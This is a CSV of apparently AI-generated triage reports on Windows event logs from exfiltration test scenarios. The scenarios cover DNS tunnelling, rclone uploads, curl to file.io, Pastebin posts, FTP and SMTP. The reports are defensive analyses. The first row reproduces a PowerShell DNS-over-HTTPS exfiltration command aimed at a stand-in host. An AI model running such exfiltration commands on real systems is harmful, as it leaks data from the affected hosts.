Directory Name,AI Response
DNSExfiltration (doh),"Upon analyzing the provided Windows event logs, the following points of interest have been identified that suggest potential malicious activity:

1. **PowerShell Activity**:
   - The logs show the execution of `PowerShell.exe` with the command line indication of importing and executing a script: 
     ```
     powershell.exe & {Import-Module ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script.ps1""; Invoke-scripttrator -i ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script.ps1"" -d target.example.com -p file -doh google -t 500}
     ```
   - The use of `PowerShell` with obfuscated paths or shortened user path (`ADMIN_~1`), especially importing scripts from a temporary directory, is often indicative of malicious script execution.

2. **Use of `wevtutil.exe`**:
   - Multiple executions of `wevtutil.exe` are observed in a short period. `wevtutil` is a legitimate tool used for managing event logs but can also be leveraged by attackers to clear logs to cover tracks, though the logs don't indicate such operation directly.

3. **Unusual Process Activity**:
   - There is frequent but non-explicit invocation of `conhost.exe`, `whoami.exe`, and `wevtutil.exe` without clear contextual triggers. These might be used to enumerate system information or manage event logs.

4. **Unusual Execution of Host System Programs**:
   - Legitimate tools (`hostname.exe`, `whoami.exe`) are executed. These tools can be used for reconnaissance or gathering system information, suggestive of preparatory steps in an attack sequence.

5. **Elevated Integrity Level**:
   - The processes, including PowerShell and other command executions, run with ""High"" integrity levels, increasing potential risk if they are leveraged maliciously.

6. **Summary of Observations**:
   - Given the presence of obscured PowerShell commands and consistent usage of system tools often employed in post-exploit scenarios, there is an indication of suspicious behavior.

Based on the analysis of these points, the activity logged is categorized into the resolution of **SUSPICIOUS**. The activity does not conclusively confirm malice but certainly warrants further investigation, including:

- Identifying the source and intent of the `Externalfiles\\script.ps1`.
- Reviewing account activities and other logs for signs of unauthorized access or horizontal movement.
- Performing specific threat intelligence checks on the hashes of defined processes.
- Ensuring endpoint security tools (e.g., antivirus, EDR) are alerting on unexpected PowerShell activities or changes in integrity levels."
Exfiltration Over Alternative Protocol - HTTP,"In reviewing the provided Windows event logs, I've identified several entries that could potentially indicate malicious activity. Here's a detailed analysis:

1. **Application Log:**
   - There is an entry from the Software Protection Platform Service; however, this doesn't seem to directly indicate any suspicious activity. It's related to standard Windows operation and time rules enforcement.

2. **Security Log:**
   - Event ID 4616 indicates a change in system time. The NewTime is earlier than the PreviousTime, indicating a backward adjustment. Such time changes can be suspicious if not explained by maintenance or administrator actions, as attackers might manipulate system time to avoid detection or confuse auditors.
   - Event ID 4634 indicates a log off by user 'admin_test' and Event ID 4672 involves assigning powerful privileges to the same user ('admin_test'), including SeDebugPrivilege, which is often misused by attackers for process injection and privilege escalation.
   - Several 4624 login events using NTLM authentication from an external workstation ('DESKTOP-3HL5B2P') and with IP addresses that resolve to local subnets (IPv6 fe80::866a:d1f8:8d06:7bc), coupled with elevated tokens, suggest a potential for lateral movement or unauthorized access attempts.

3. **Windows PowerShell Log:**
   - Entries show that PowerShell executed a script to read content from `C:\Windows\System32\notepad.exe` and posted it to `http://127.0.0.1`. Although this address is the local host, indicating no outside communication, the behavior of web request posting binary content is unusual and could be a simulation or testing of malicious payload execution or exfiltration.

4. **Sysmon Log:**
   - Multiple executions of `whoami.exe`, `hostname.exe`, and several `conhost.exe` instances are noted. While these are legitimate Windows binaries, their execution through PowerShell in quick succession can suggest enumeration attempts by an attacker.
   - Additionally, there are suspicious instances of `wevtutil.exe`, which is a known tool used to query and backup Windows event logs potentially as part of anti-forensics or log clearing activities.
   - The Sysmon logs also show processes associated with Microsoft EdgeUpdate operations, which appears consistent with auto-update activities but should be verified as benign.

5. **System Log:**
   - The NewTime is adjusted backward similarly in kernel-general events, consistent with potential unauthorized time change activity.

### Conclusion:

- **Resolution: SUSPICIOUS**

There are multiple signs consistent with potential malicious activity, particularly involving suspicious PowerShell activity, privilege escalations, and time changes. These events warrant further investigation. Specifically, time changes should be checked for explanation and corresponding administrative tasks, PowerShell scripts reviewed for potential obfuscation, and user 'admin_test' has privileges that need verification of necessity and legitimacy. Network activity, especially concerning the logon events from 'DESKTOP-3HL5B2P', should be closely monitored or blocked.

### Guidance:

- Review administrative activities around the time adjustments and validate the necessity of the privileges assigned to 'admin_test'.
- Analyze the content and source of the PowerShell scripts for indications of tampering or unauthorized modifications.
- Conduct threat hunting focusing on detecting similar patterns or shadow activities in other systems.
- Ensure comprehensive endpoint logging and possibly implement additional restrictions or monitoring for the suspicious user and source workstations."
Exfiltration Over Alternative Protocol - ICMP,"### Detailed Analysis and Assessment

**1. System Log**
- The system log entries indicate timezone and time updates handled by svchost.exe, a legitimate Windows process that handles hosting services. 
- Event ID 35 from the Windows-Time-Service showing time synchronization with time.windows.com is a standard process.
- No anomalous activities detected in the system logs.

**2. Sysmon Log**
- Multiple instances of **wevtutil.exe** and **conhost.exe** execution are noted. The users initiating these processes are SERVER002\admin_test. While these applications are legitimate, frequent rapid succession invocations may suggest further investigation if they were unauthorized or not a recognized maintenance script.
- **hostname.exe** and **whoami.exe** executions by SERVER002\admin_test also appear legitimate as these are standard system command-line tools used to report system identity and user information, respectively.
- **WindowsPowerShell** (powershell.exe) execution showed a command involving pinging with data read from notepad.exe, which is suspicious. This behavior could be an indicator of data exfiltration or system probing and should be investigated further.

**3. Security Log**
- Time changes logged with Event ID 4616 are performed by svchost.exe, usually a legitimate activity but in conjunction with other events, may need cross-verification to ensure these changes are authorized.

**4. Windows PowerShell Log**
- Consistent with the Sysmon log, the PowerShell log reflects the unusual script execution that involves network pinging with data extracted from notepad.exe. This activity is atypical for benign administrative tasks and warrants further investigation to ensure it was not part of an unauthorized script or script injection.

**5. Application Log**
- No suspicious activities recorded. The logs show typical application logging from Microsoft components like the Software Protection Platform Service.

### Threats and Risks Identified
- The most concerning part is the PowerShell script execution which reads data and sends pings, potentially indicating an unusual pattern that could be leveraged for malicious activities.
- High-level integrity context of the running PowerShell processes also raises the risk of privilege misuse.

### Guidance
Given the analysis, the resolution for the situation is deemed **SUSPICIOUS** due to:
- The potentially atypical PowerShell command involving data read from a system file (notepad.exe) and network activity.
  
### Recommended Actions
1. **Immediate Investigation**: Verify if the suspicious PowerShell script execution was an approved or known activity. If not, consider reviewing potential scheduled tasks or triggered jobs on the server.
2. **Audit User Actions**: Audit activities under the user SERVER002\admin_test to ascertain if actions performed align with standard operational duties.
3. **Review Network Logs**: Check for unusual outbound traffic patterns, especially related to those PowerShell activities.
4. **System Integrity Check**: Perform a full integrity check of system components to ensure that no unauthorized changes have been made.
5. **Security Policy Review**: Reinforce PowerShell logging and script execution policies to capture more detailed activities, leveraging tools like Constrained Language Mode or Just Enough Administration (JEA).

By proceeding with this investigation and remediating any unauthorized activities or processes, you can mitigate potential threats to the system's security posture."
C2 Data Exfiltration,"Upon analyzing the logs provided, here is a detailed breakdown of my findings:

1. **Application Log:**
   - The event relates to the Software Protection Platform Service, which is responsible for license compliance enforcement for Windows and its applications. The event is fairly routine and doesn't indicate any suspicious behavior.

2. **System Log:**
   - The logs primarily relate to time zone and time synchronization updates, which are normal system behaviors. No anomalies or suspicious activities are inferred from these entries.

3. **Windows PowerShell Log:**
   - There is a PowerShell command that uses `Invoke-WebRequest` to send content from a file located in the TEMP directory to ""example.com"". This behavior can be indicative of suspicious activity or data exfiltration if ""example.com"" is unrecognized or not associated with legitimate operations.
   - The use of PowerShell for web requests in this manner warrants further investigation, as it could be used maliciously.

4. **Security Log:**
   - There are several privilege escalation entries (`EventID 4672`), where the user `admin_test` is granted several high-level privileges.
   - The logon events (`EventID 4624`) for `admin_test` show network logins (Logon Type 3) from an external source (`DESKTOP-3HL5B2P`), which might need verification.
   - While privileged operations are noted, the context doesn't immediately suggest malicious activity but merits further scrutiny regarding the necessity and intent of these actions.

5. **Sysmon Log:**
   - There are frequent executions of `wevtutil.exe` and `conhost.exe`, which are typical Windows processes. However, their repeated executions in quick succession should be reviewed further to rule out misuse.
   - The execution of utilities like `hostname.exe`, `whoami.exe`, and `PowerShell` scripts in sequence might suggest automated tasks. The PowerShell command mentioned in the PowerShell logs also appears here, reinforcing its potential importance in this analysis.

### Assessment:

- **PowerShell Usage:** Usage involving `Invoke-WebRequest` in scripts is often benign in administrative scripts. However, pushing data to external domains can be concerning, especially if those domains are unfamiliar.
- **Security Events:** The presence of high-level privileges and network logins should be reviewed within the context of recent user activities or administrative tasks to ensure compliance with expected behavior.
- **Frequency and Context:** The quick and repeated succession of legitimate system tools like `wevtutil.exe` and `conhost.exe` can appear suspicious in some attack scenarios but are not inherently malicious.
  
### Resolution:

**SUSPICIOUS** - The logs contain PowerShell activity that potentially signifies data exfiltration, and high-privilege security events that should be investigated further. It is recommended to verify network traffic related to ""example.com"" and review the usage of `admin_test` for unauthorized actions or privilege abuse.

**Guidance for Further Investigation:**
- Validate the hostname and operations related to `example.com` within your network infrastructure.
- Review user `admin_test` activity logs and correlate with known administrative tasks.
- Check for additional similar PowerShell scripts or scheduled tasks that may reveal the intent.
- Ensure all tools and scripts being run are approved and in line with company policies."
Exfiltrate data HTTPS using curl windows,"In reviewing the provided Windows event logs for Server002, particularly focusing on the Sysmon logs, several events are highlighted that may warrant further investigation. Here's the breakdown:

1. **PowerShell Execution**:
   - The logs indicate an instance of PowerShell being executed: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` by `SERVER002\admin_test`. While PowerShell usage is often legitimate, it's a common tool used by attackers for malicious purposes. The context here matters, as no specific command line arguments are provided that indicate harm.

2. **Frequent Use of Wevtutil**:
   - There are several instances of `wevtutil.exe` and `conhost.exe` processes starting successively. 
   - `wevtutil` is a command-line utility used for managing event logs, and repeated unexpected use can indicate someone trying to clear logs to cover tracks.

3. **Suspicious CMD and Curl Command**:
   - A `cmd.exe` process is seen running with a command line involving `curl.exe` to apparently upload data to an external URL (`https://file.io/`). 
   - This behavior could indicate data exfiltration, as the file being uploaded from a temp directory suggests a potential breach of sensitive information.

4. **Use of Whoami and HOSTNAME.EXE**:
   - The execution of tools like `whoami.exe` and `hostname.exe` seems benign unless correlated with other malicious actions. Attackers often use these tools to gather information about the system and user permissions.

5. **Presence of WMI Provider Host**:
   - The execution of `WmiPrvSE.exe` is noted, which is a legitimate Windows process but can be used by attackers for various semi-legitimate tasks.

**Concluding Analysis**:
- **SUSPICIOUS**: There are elements within these logs that are notably suspicious and suggest potential illegitimate use or compromise:
  - The frequent execution of processes associated with event log management (`wevtutil.exe`) combined with network-based file transfers (`curl.exe`) are red flags that need a deeper examination.
  - Specific use of PowerShell should be further analyzed for any potentially harmful scripts executed.
  - The command involving `curl` particularly stands out as potential data exfiltration.

**Recommended Actions**:
1. Investigate the necessity and purpose of the PowerShell activities logged.
2. Review user and system-level logs to verify the legitimacy of the frequent `wevtutil` usage.
3. Perform network monitoring or logs checks to see if outbound traffic to `file.io` or similar indicates meaningful data exfiltration.
4. Conduct a thorough forensic analysis to determine if there was any unauthorized data access or system intrusion.

Further investigation is crucial to rule out or confirm malicious activity potentially impacting the integrity or confidentiality of the company's data on Server002."
IcedID Botnet HTTP PUT,"Upon examining the provided logs, there are several key points to highlight:

1. **Security Log Analysis**:
   - **Event ID 4624** indicates successful logons using the NTLM authentication package, which may not inherently be suspicious. However, the ""LogonType"" is 3, indicating a network logon that can be normal in certain environments.
   - **Event ID 4672** shows that the user ""admin_test"" logged in with several high privileges like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, among others. Although this can be normal for an admin account, misuse or unauthorized use of such privileges can be concerning.
   - **Event ID 5379** indicates failed credential access attempts related to a `MicrosoftAccount:user=02txoixylodcstop`. The repeated failure (return code 3221226021) could either be normal (resulting from legitimate synchronizing issues) or suspicious if this account is unfamiliar or unauthorized.

2. **Sysmon Log Analysis**:
   - Multiple instances of `wevtutil.exe` and `conhost.exe` executions are present, which may not be suspicious by themselves, as they are normal Windows utilities. However, frequent and rapid executions suggest they should be investigated further if unexpected.
   - Execution of `powershell.exe` (Event ID 1) with a script attempting to PUT a file to a remote server using `Invoke-WebRequest` is a suspicious activity. PowerShell scripts that perform network connections can be a method for data exfiltration.

3. **Windows PowerShell Log Analysis**:
   - The PowerShell script seen in these logs corroborates the suspicious activity found in the Sysmon logs. It is noteworthy that the script creates a file and attempts to send it over the Internet. This behavior should be investigated further to ensure it wasn't carrying sensitive data out of the network.

**Conclusion**:
- The use of administrative privileges and the PowerShell script attempting network communication with an external server are definite red flags.
- Given the combination of privileged access and suspicious scripting activity, but not enough evidence to confirm data was exfiltrated or what type of data was involved.

**Resolution: SUSPICIOUS** – The logs exhibit behaviors that warrant further investigation to clarify the intention and legitimacy of the actions, particularly surrounding the PowerShell activity and network logons. The environment should be monitored for similar occurrences, and a review should be conducted to ensure no sensitive data has been compromised. Further investigation into the origin and purpose of the PowerShell script is necessary."
Exfiltration via Encrypted FTP,"Upon reviewing the provided event logs from the Windows host, several activities raise red flags indicating potential suspicious behavior that warrants further investigation. Below are the key observations:

1. **Time Change Events** - The logs reveal numerous instances of time change events (EventID 4616 in the security log and similar in the system log):
   - The time was changed from 2024-10-21 10:45:30.4414885 to 2024-10-21 10:45:13.7411431, which is unusual and could suggest attempts to manipulate logs or timestamps for nefarious purposes.
   
2. **Credential Events** - Credential operations (EventID 5379 in the security log) show failed access attempts or credential manipulation:
   - Specific references to failed or empty credentials being attempted against `MicrosoftAccount:user=02txoixylodcstop` and `WindowsLive:`.
   - Return codes like `3221226021` indicate STATUS_NO_SUCH_LOGON_SESSION, suggesting potential unauthorized or failed authentication attempts.

3. **Privilege Assignments** - Privilege assignment events (EventID 4672 in the security log) indicate admin privileges were assigned to a user `admin_test` and SYSTEM:
   - Privileges included SeDebugPrivilege, SeTcbPrivilege, SeImpersonatePrivilege, etc., which can be dangerous if in wrong hands.
   - These privilege assignments occurring around the same time as other suspicious activities can suggest privilege escalation attempts.

4. **Suspicious Process Executions** - Multiple processes of interest were executed, as revealed in Sysmon events:
   - Execution of `powershell.exe` with command involving FTP uploads (EventID 1 in Sysmon log):
     - Command: Invoking a PowerShell script to write a file and upload to an FTP server, complete with credentials, is concerning for potential data exfiltration.
   - Execution of `wevtutil.exe` and manipulation of event logs (EventID 5 in Sysmon log).
   
5. **Unusual Network Connections** - Network activity from non-standard IP address might be associated with these suspicious powershell activities especially for admin activities being logged from a device named `DESKTOP-3HL5B2P`.

6. **Application and System Updates** - Frequent updates and software changes especially related to Windows Defender and Microsoft Edge as evidenced in Windows Update and Edge Update events. These could be benign but should be reviewed for consistency with patch management policies.

### Resolution: SUSPICIOUS

Considering the collection of events observed, the activities do not definitively conclude malicious actions due to lack of comprehensive evidence on compromise; however, the cluster of privilege escalations, credential errors, time manipulation, and suspicious script executions represent a pattern that can be indicative of an attacker preparing or carrying out nefarious activities.

**Recommendations**:
- Conduct a thorough audit of user `admin_test` activity including any non-normal working hours access.
- Examine the PowerShell script usage and monitor the network traffic for any unexpected data exfiltrations.
- Validate any recent changes made to the event logs and re-enable security audit policies.
- Review privilege changes and ensure least privilege is consistently enforced across all accounts.
- If unauthorized activity is determined, re-evaluate affected systems and credentials, and plan for potential remedial measures including a detailed forensic analysis."
Exfiltration Over Alternative Protocol - FTP - Rclone,"After analyzing the provided Windows event logs, I've identified several activities that suggest suspicions of malicious behavior. Here's a detailed analysis:

1. **PowerShell Execution**: There's a recurring PowerShell command being executed which includes the use of `rclone`, a tool often used for file transfers, with command arguments suggesting it's set up to interact with an FTP server (`ftp.dlptest.com`). The command logs show that the PowerShell command extracts `rclone.exe` and `script.zip` from `C:\Users\Public\Downloads\` and configures an FTP server entry. This activity may indicate data exfiltration attempts, especially considering that it's configured to use a specific FTP server with known credentials.

2. **Frequent Process Creation**: The logs show multiple instances of common system processes (e.g., `wevtutil.exe`, `conhost.exe`, `whoami.exe`) being spawned in rapid succession in a pattern that's uncommon for regular operations. This batch-like activity might be indicative of an automated script or malicious actor attempting to escalate privileges, gather system information, or avoid detection.

3. **Event ID 5379**: There are numerous entries related to credential enumeration attempts (`EventID 5379`) indicating attempts to read credentials. These attempts have failed (`ReturnCode 3221226021`), which could imply unsuccessful unauthorized attempts to access sensitive credentials.

4. **Security Log Entries**: The Security logs show `Event ID 4624` (logon events), and `Event ID 4672` which indicates special privileges were newly assigned. This could align with privilege escalation attempts, as critical system privileges are granted.

5. **Application Logs and Windows Defender**: The Application logs indicate that Windows Defender is running and active but doesn't show any alerts or blocks concerning detected threats. This might suggest the activity is crafted to evade detection or Windows Defender was unable to identify it as malicious.

Given these considerations, several factors suggest a highly suspicious pattern, particularly surrounding the usage of PowerShell to run `rclone` potentially for exfiltrating data, combined with attempts to read credentials and privileged operations on the system.

**Resolution: SUSPICIOUS**

While these indicators suggest potentially malicious activity (primarily through the PowerShell and `rclone` usage), I recommend conducting a deeper investigation before a definitive determination of compromise. Here’s how to proceed:
- Confirm whether the use of `rclone` is authorized by checking with system administrators.
- Investigate the context and origin of the PowerShell scripts and scheduled tasks or automation responsible for execution.
- Perform a deeper inspection of filesystem changes and network traffic associated with `ftp.dlptest.com`.
- Use additional security tools or logs to identify any potential lateral movement or persistence mechanisms.

This analysis should help establish the intent of these activities and whether further actions, such as containment or eradication, are required."
Exfiltrate data with rclone to cloud Storage - Mega (Windows),"Upon reviewing the provided Windows event logs, certain activities stand out that indicate potentially malicious behavior or at least require further investigation:

1. **Security Log Analysis**:
   - Event ID 4624 logs a successful logon of type 5 (service startup), which is typically benign as it involves the SYSTEM account and services.exe. However, subsequent Event ID 4672 shows the assignment of a large number of privileges, including `SeDebugPrivilege`, which can be a sign of privilege escalation activities frequently associated with malicious behavior, although this by itself is not definitive without additional context.

2. **PowerShell Log Analysis**:
   - The PowerShell logs reveal a script execution where `rclone.exe`, a command-line program to manage files on cloud storage, is being utilized to perform a transfer to the cloud storage service Mega. Such behavior (data exfiltration to a cloud storage) is suspicious if initiated without proper authorization or business need.
   - The configuration details, including a user and password for the Mega service in the command, indicates that credentials are being hardcoded in scripts, which compromises security best practices.

3. **Sysmon Log Analysis**:
   - Sysmon logs indicate process creations associated with `PowerShell.exe` running scripts that align with the PowerShell logs, which appears to be coordinated data upload. The user `admin_test` running these scripts and using `rclone` in such a manner could be a potential red flag, possibly involving data exfiltration. The presence of processes like `rclone.exe` and the level of access depicted can imply unauthorized use of data transfer utilities.
   - The use of `wevtutil.exe`, a command-line utility to interact with event logs, observed multiple times in the Sysmon log, potentially indicates log tampering or clearing activities, often associated with attempts to cover up tracks.

### Assessment:
- **Risk**: The combination of privilege assignments, PowerShell activity involving `rclone` for transferring data to cloud storage, and Sysmon logs indicating potential log tampering, collectively raise significant red flags.
  
- **Threat**: There's a high risk of data exfiltration or internal reconnaissance. If this behavior is not part of routine administrative tasks duly authorized and documented, it represents a likely compromise or malicious insider threat.

### Resolution:
- **MALICIOUS**: The logs exhibit signs of malicious activity, primarily involving suspicious use of PowerShell and data exfiltration attempts using `rclone`. Immediate investigation and containment steps should be taken, such as verifying the legitimacy of the `rclone` usage, reviewing user activity for `admin_test`, checking for anomalies in user account usage, and ensuring all security policies and logging are correctly configured and functioning. Potentially compromised accounts or processes should be isolated, and critical data access should be reviewed and, if necessary, restricted."
Exfiltrate data with HTTP POST to text storage sites - pastebin.com (Windows),"Upon analyzing the provided Windows event logs, several activities are noticeable which might indicate potential security concerns. Here's a detailed analysis of the logs:

1. **Suspicious PowerShell Activity**: There is a notable PowerShell script execution indicated in the PowerShell log. The PowerShell command involves a script attempting to post data (including API keys and potential secrets) to Pastebin using `Invoke-RestMethod`. This is a classic indicator of data exfiltration activity, which is a common technique used in malicious activities.

2. **Use of Elevated Privileges**: The Security log shows that the user `admin_test` was granted several high-level privileges upon login (Event ID 4672), including SeDebugPrivilege, SeBackupPrivilege, and SeRestorePrivilege. While not inherently malicious, this can be concerning if these privileges are misused in conjunction with the PowerShell activity.

3. **Time Manipulation**: There is a sudden shift in system time observable in the Security log (Event ID 4616), where the time is set back from 14:29:47 to 14:29:40. This kind of activity can be used to obfuscate genuine timestamps, which is often indicative of malicious intent to tamper with log evidences.

4. **Process Executions**: There are numerous instances of legitimate system processes such as `whoami.exe`, `hostname.exe`, `conhost.exe`, and various Microsoft Edge updates executing. These processes by themselves appear to be benign, but they coincide with an unusual pattern of repeated paired executions, possibly reflecting a broader script or command being run.

5. **Wevtutil Usage**: The execution of `wevtutil.exe` is suspicious if run outside standard administrative or normal operational activities. It can be used for exporting, clearing, or modifying event logs, which may indicate an attempt to hide tracks after certain actions.

Given these observations, the logs exhibit several indicators of potential malicious activity, particularly centered around the PowerShell script usage and high-level privileges granted to `admin_test`. The manipulation of system time is also a noteworthy red flag pointing towards an attempt to evade detection.

### Resolution: MALICIOUS

### Recommendations:
- **Immediate Containment**: Stop and review the current activities under the user account `admin_test`, and investigate its recent actions on the network and system.
- **Audit PowerShell Logs**: Increase logging levels for PowerShell to capture detailed command execution in the future. If not already done, enable transcription and logging.
- **Review Privileges**: Examine the necessity of the privileges granted to `admin_test`, ensuring least privilege principles are observed.
- **Monitor External Communications**: Check for any unusual or unauthorized communications from the server that may have been initiated during the timeline analyzed.
- **Forensic Analysis**: Consider a deeper forensic analysis of the system to gather more evidence regarding potential data exfiltration and any traces of script execution.

These steps will help in mitigating any ongoing risks and uncovering the full extent of potentially malicious activities."
Exfiltration Over Alternative Protocol - SMTP,"**Analysis of Provided Logs:**

1. **Normal Activity:**
   - **System Processes:**
     - Several events indicate the execution of standard Windows processes such as `whoami.exe`, `conhost.exe`, `hostname.exe`, and `MicrosoftEdgeUpdate.exe`. These processes are part of regular Windows operation and typically do not signify malicious activity on their own.
  
   - **Time Synchronization:**
     - The time change events (`EventID 1` from Microsoft-Windows-Kernel-General and `EventID 4616` from Microsoft-Windows-Security-Auditing) appear to be related to normal time synchronization activities.

2. **Suspicious Activity:**
   - **PowerShell Command:**
     - There is a significant suspicious activity noted with the execution of a PowerShell command using the `Send-MailMessage` cmdlet. This command sends an email with the `notepad.exe` application attached to an internal email address and uses the local host as an SMTP server. This behavior can indicate data exfiltration or a precursor to a phishing attack.
     - The combination of sending a system executable via email and using PowerShell, which is a common tool used by attackers due to its flexibility and powerful capabilities, raises a red flag.

3. **Assessment:**
   - The use of PowerShell to send an email with a system executable attached is indicative of potentially malicious intent. Even though this alone does not confirm an active compromise, it warrants further investigation to ensure system integrity and security.
   - The Sysmon logs correspond to normal system activities and do not show any direct malicious process executions outside the suspicious PowerShell command.

**Resolution:**

- **SUSPICIOUS**

Given the analysis, the activity related to the PowerShell command is categorized as suspicious. Further investigation should be conducted to verify the intent and outcome of the PowerShell command, ensure no data exfiltration occurred, and assess whether it was legitimately executed by an authorized user or indicative of a potential security breach.

**Guidance:**

- **Immediate Actions:**
  1. **Review User Activity:** Investigate the actions and permissions of the user `SERVER002\\admin_test` to understand the context of this command execution.
  2. **Analyze Network Traffic:** Monitor network traffic for any unusual activity stemming from this host during the timeframe of the logs.
  3. **Examine Email Server Logs:** Check email server logs to confirm the receipt and handling of the message sent by PowerShell and investigate if there were any attempts to exfiltrate data.
  4. **Scan For Malware:** Perform a thorough malware scan on the system to check for any signs of compromise or tampering.

- **Preventative Measures:**
  - Implement stricter PowerShell execution policies and logging to catch and prevent unauthorized use.
  - Educate and train users about secure and responsible use of powerful system tools and commands.
  - Enhance monitoring and alerting to detect similar suspicious activities in the future."
Text Based Data Exfiltration using DNS subdomains,"### Analysis of Windows Event Logs:

The logs provided for analysis consist of several Sysmon events, Windows PowerShell events, Security logs, and other system activities. Here is a breakdown of the notable entries:

#### Sysmon Logs

1. **Wevtutil and Conhost Processes**:
   - The repeated execution of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test` across several logs is consistent and occurs within milliseconds of each other. While `conhost.exe` is common for console tasks, `wevtutil.exe` is used for managing event logs and could be suspicious if executed frequently or with certain arguments.
   - No suspicious command lines are logged with these processes, only their execution.

2. **PowerShell Activity**:
   - The execution of `powershell.exe` with an encoded command to interact with DNS queries (`Resolve-DnsName`) seems suspicious. The script is splitting and encoding data into Base64 format, then transmitting it through DNS, which could be an indicator of data exfiltration or covert communication.

3. **Host Processes**:
   - Processes like `svchost.exe`, `MicrosoftEdgeUpdate.exe`, and related update executables appear to function typically, possibly related to system maintenance or updates.

4. **Miscellaneous Executions**:
   - `whoami.exe` and `hostname.exe` executions by the user `admin_test` are generally benign and indicative of user/system information queries.

#### Windows PowerShell Logs

- The PowerShell logs confirm the execution of a script, matching the suspicious script discovered in the Sysmon logs, characterized by splitting, encoding, and DNS querying methodology.

#### Security and System Logs

- **Time Synchronization**:
  - Time adjustments recorded could indicate system clock changes which might be benign or malicious depending on the context, but there's no direct indication here of a security breach related to this.

#### Conclusion and Recommendation

- **Identified Risks**: The use of PowerShell to potentially exfiltrate data is the most notable risk observed. Such techniques align with known methods of bypassing network security by disguising the communication within legitimate DNS traffic.

- **Resolution**: The activity associated with PowerShell seems to be indicative of a potentially ***MALICIOUS*** action, given the encoding of data and DNS queries that suggest covert data movement.

### Guidance on How to Proceed:

1. **Immediate Actions**:
   - Terminate or monitor the ""powershell.exe"" process on Server002, and investigate the administrative account ""admin_test"" involved in executing the suspicious script.
   - Review DNS logs or network traffic for unusual patterns that align with the timeframe of encoded DNS queries noticed in the PowerShell logs.

2. **Forensic Analysis**:
   - Conduct a full forensic investigation on Server002 to verify the presence of any further indications of data exfiltration or malware.
   - Check the user activity logs for `admin_test` and the origins of the script or any unauthorized access.

3. **Long-term Mitigation**:
   - Implement stricter monitoring of PowerShell executions and command-line arguments. Consider using PowerShell's extended logging features to gain more visibility into script executions.
   - Educate users about security practices involving script executions and administrative activities, especially concerning sensitive data handling.

By taking these steps, the potential threat can be better understood, contained, and mitigated."
MAZE FTP Upload,"### Analysis of Provided Windows Event Logs

#### Summary of Findings:
1. **Frequent Use of System Utilities:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` are seen, which are legitimate Windows utilities.
   - Their execution with the `admin_test` account within a short period raises some suspicion as they are often leveraged in administrative tasks, but consistent usage close together may indicate script execution.

2. **PowerShell Activity:**
   - A PowerShell script was executed with the purpose of uploading files from the Windows Temporary directory to an FTP server located at `127.0.0.1`. 
   - The script utilizes a `WebClient` object to potentially exfiltrate data, which is suspicious.

3. **System Time Changes:**
   - There are recorded events of the system time being altered, appearing to be set backward. This might indicate an attempt to confuse logging or reflect timestamps artificially, suggesting potential cover-up of activities.

4. **Processes of Concern:**
   - `powershell.exe` execution stands out due to its command-line arguments aiming to transfer files.
   - No unusual process creation in terms of unknown binaries or new binaries but high usage of certain utilities for what seems like scripted automation.

#### Indicators of Malicious Activity:
- **PowerShell Script Execution:** The command executed is aimed at file exfiltration, albeit the FTP server is `localhost`, suggesting possible testing or misconfiguration.
- **Time Change Events:** Altering system time is commonly associated with attempts to mislead forensic investigations.

#### Conclusion:
Based on the provided logs, there is evidence of activities that could be considered suspicious, mainly the PowerShell script attempting data transfer over FTP and the system time change activities that could be an attempt to obfuscate actions.

### Resolution: SUSPICIOUS

Given the identified PowerShell activity designed to upload files potentially and the system time manipulation, these need further investigation to confirm if these actions pose a real threat or are benign activities set by an administrator or application. This could involve:

- **Further Steps:**
  - Investigate the source and reason for the PowerShell script execution: Identify who executed it and the purpose behind utilizing the script.
  - Confirm if the FTP upload script has communicated externally despite `127.0.0.1` being local, ensuring no actual data exfiltration has occurred.
  - Review access logs and network logs for any abnormal access patterns or data transfers.
  - Check system policies to ensure time changes have valid reasoning and are not indicative of malicious intent.

Network-Based Data Transfer in Small Chunks,"Upon analyzing the provided set of event logs from the Windows machine, several noteworthy observations can be made:

1. **Windows Update Events (System Log)**:
   - The entries detail regular updates to Microsoft Defender Antivirus. The updates are typical and align with expected behavior for a Windows system receiving routine security updates. No anomalies are present here.

2. **Application Log**:
   - This confirms that Windows Defender is enabled and operational, evidenced by the ""SECURITY_PRODUCT_STATE_ON"" status. This is a normal entry indicating that the security product is functioning as expected.

3. **Sysmon Log Analysis**:
   - **Sysmon Events involving wevtutil.exe and conhost.exe**: The execution of `wevtutil.exe` and `conhost.exe` as observed is typical when dealing with command-line or administrative processes run by system administrators. This does not inherently signal suspicious activity.
   - **Command Execution Details**: There are several entries capturing processes like `hostname.exe`, `whoami.exe`, and `powershell.exe`. Running `whoami.exe` and `hostname.exe` can be part of normal administrative tasks, perhaps to fetch or verify user and system information.
   - **PowerShell Activity**: One of the most concerning entries relates to a PowerShell script attempting to read a file, encode it in Base64, and then send it via an HTTP POST request to `http://example.com`. This is a highly suspicious activity indicative of potential data exfiltration attempts or unauthorized data transfer.

4. **Security Log**:
   - Repeated entries of Event ID 5379 suggest possible credential access or enumeration attempts; however, all returned a specific error code (3221226021), which may indicate failed attempts or interactions. This does not conclusively prove malicious activity on its own.

5. **Windows PowerShell Log**:
   - Entries reveal the execution of a PowerShell command, which aligns with the potentially malicious activity identified. The script involves reading a file, chunking data, converting it to Base64, and uploading it. This operation closely mimics data exfiltration techniques often employed by attackers.

**Assessment**:

The logs provide strong evidence of suspicious activity due to the nature of the PowerShell command found in the Sysmon and Windows PowerShell logs. The command is set up for reading and transmitting data externally, which is not typical for benign operations and suggests malicious intentions.

**Resolution**: **MALICIOUS**

**Guidance**:
- Immediate investigation into the source and execution context of the PowerShell script is required.
- Identify the file being accessed and ensure its integrity.
- Analyze network logs to corroborate any unauthorized data transfers initiated from the system.
- Review access logs to determine if any unauthorized or anomalous authentication attempts correlate to this activity.
- Conduct a thorough audit of the system for any other indicators of compromise or unauthorized administrative access.
- If possible, block the destination URL and isolate the machine from the network to prevent further data compromise.
- Implement enhanced monitoring and network segmentation to contain potential threats and prevent recurrence.

Given the observed activity, take steps to identify whether the actor responsible can be pinpointed, and ensure any exploitative scripts or malware are removed or neutralized."
